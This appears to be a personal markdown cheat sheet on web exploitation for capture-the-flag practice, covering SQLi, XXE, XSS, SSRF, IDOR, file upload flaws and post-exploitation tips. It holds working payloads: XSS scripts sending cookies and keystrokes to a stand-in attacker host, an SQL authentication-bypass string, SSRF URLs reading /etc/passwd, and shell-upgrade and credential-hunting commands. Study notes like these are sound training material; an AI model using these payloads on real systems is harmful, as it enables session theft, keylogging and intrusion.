# Web Exploitation
## Files
- [/robots.txt](https://developers.google.com/search/docs/advanced/robots/intro)
- [/humans.txt](https://humanstxt.org/)
- [/sitemap.xml](https://developers.google.com/search/docs/advanced/sitemaps/overview)
## Tools / Resources
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Tplmap](https://github.com/epinna/tplmap): assists exploiting code injection and SSTI vulnerabilities
- [XSRFProbe](https://github.com/0xInfection/XSRFProbe): CSRF audit and exploitation toolkit
- [WPscan](https://wpscan.com/wordpresses)
    - `wpscan --url <url> --api-token -e vp,vt --api-token <token>`: enumerate worpress vulnerable plugins and themes
- [nikto](https://securitytrails.com/blog/nikto-website-vulnerability-scanner): web server vuln scanner
    - may need to look at `-Help` not all info in man pages
    - use `-until` to set scan duration
        ```bash
        # default scan
        nikto -h <url> -p <port> -output <file.txt>
        ```

## Methods/Techniques
### Broken Authentication
- Re-registration: improper registration implementation, allows registration of "duplicate" users such as " admin" in place of "admin" with identical priveleges. Notice the _space_ in the first username.

### File Inclusion
- [LFI (Local File Inclusion)](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/): include file
- [RFI (Remote File Inclusion)](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)

### SQLi
- [sqlmap](https://sqlmap.org/): automated SQLi scanning tool
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- In-Band SQLi: the same method of communication used for the exploit receives the results
    - Error-Based: we get back error messages which are useful for obtaining info enumerating the DB
    - Union-Based: uses a `UNION` to return additional results to a page
- Blind SQLi: 
    - Authentication Bypass: bypass auth with something like `'username=1' or 1=1'; --`
    - Boolean Based: use true/false values or equivalent info returned to the page to enumerate DB
        - This approach requires some fuzzing to confirm the database, table, and column names before querying for specific data
    - Time Based: this is case is similar to Boolean Based, except there won't be any apparent response indicating if a query is true or false. Instead it must be inferred based on how much time the query takes to complete
        - The `SLEEP()` function can be used to introduce delay longside the `UNION` statement
- Out-of-Band SQLi: less common requires specific configuration on the DB server or web app logic making an external network call
    - defined by two communication channels, one to launch the atack and another for gathering results
    
### JWT Vulns / Tools
- [JWT (JSON Web Tokens)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [JWT Debugger](https://jwt.io/#debugger-io)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

### XXE (XML eXternal Entity)
Abuse of XML parsers/data to interact with the bacckend or external systems. 
- XXE (In Band): the attacker receives immediate response to the XXE payload 
- OOB-XXE (Out Of Band) / Blind XXE: there is no immediate response from the web server and the attacker has to reflect the output of their XXE payload to some other file on their own server
- DTD (Document Type Definition) defines an XML schema.

### Broken Access Control: normal user can access 'protected' pages

### XSS ('Cross' Site Scripting)
- Persistent/Stored XSS: Persisting code on a server via website, database etc. The malicious code is executed when a webpage is loaded or a query is made to the server
- Reflected XSS: The payload is part of the victims request to the website. An attacker needs to trick a victim into using a malicious URL. This is the most common type of XSS
- DOM-based XSS: 
- Common XSS Payloads
    - Cookie/Session Stealing (e.g. post cookie to attacker controlled website)
        ```html
        <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
        ```
    - Keylogging (e.g. forward keypresses to attacker controlled website)
        ```html
        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
        ```
    - Port scanning
    - Unrestricted Upload
        - [OWASP cheatsheet](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
    - Filter Evasion
        - [OWASP cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
        - [cheatsheet2](https://www.netsparker.com/blog/web-security/xss-filter-evasion/)
### Insecure Deserialization: when untrusted data is used to abuse application logic
- Browser exploitation
    - [BeEF](https://github.com/beefproject/beef)

### SSRF (Server Side Request Forgery)
- An attacker can make further HTTP requests through a server to other services on the internal network (inside the firewall). The attack usually involves unsanitized input of a URL.
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file): could include any URLs like:
    ```http
    file:///etc/passwd
    http://localhost:3306
    ```
- [requestbin.com](https://requestbin.com/): useful for catching requests when performing Blind SSRF since no output is reflected
- Look for full and partial URLs used in a GET parameters
- Look for hidden fields in forms that using a URL

### SSTI (Server Side Template Injection)
- Template injection allows an attacker to include template code to retrieve files and execute code on the server.

### IDOR (Insecure Direct Object Reference)
- The act of exploiting a misconfiguration with how user input is handled to access normally inaccessible resources.
- e.g. `http://<target>/note.php?note=1` accessing note=2 even if the note doesn't belong to the logged in user

### API based Authentication Bypass

### File Upload Vulns
- Overwriting existing files on a server
- Uploading and executing shells on a server
- Filtering
    - Extension validation
    - MIME validation
    - File type filtering
        - Magic number validation
    - File length filtering
    - File name filtering
    - File content filtering
        - scan uploaded file to ensure no spoofing of extension, MIME type or magic number
- Fooling content type validation

## Tips & Tricks
- `sudo -l`: lists what programs you can run as sudo as the current user.
- Use `rlwrap` to get a more usable reverse shell
- `python -c 'import pty; pty.spawn("/bin/bash")'`: spawn a fully interactive shell from a reverse shell with python.
- check `~/.bash_history` (and other dot files) for user/pass info etc.
- `python3 -c http.server <port>`: run simple web server at the current directory on `localhost`
- `powershell -c "Invoke-WebRequest -Uri <URL> -Outfile <path>"` download file in `cmd`.
- __ALWAYS__ try default credentials first
